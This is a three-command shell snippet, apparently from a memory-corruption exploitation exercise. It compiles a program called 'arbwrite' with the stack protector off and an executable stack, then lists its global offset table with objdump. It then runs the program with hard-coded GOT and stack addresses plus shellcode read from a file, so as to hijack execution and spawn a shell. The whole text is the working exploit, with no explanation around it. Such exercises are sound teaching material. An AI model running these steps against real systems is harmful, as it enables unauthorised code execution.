gcc -fno-stack-protector -z execstack -o arbwrite arbwrite.c
objdump -R ./arbwrite

./arbwrite `perl -e 'print"\x10\xa0\x04\x08"'` `perl -e 'print "\xfa\xf7\xff\xbf"'` `cat shellcode/shell`
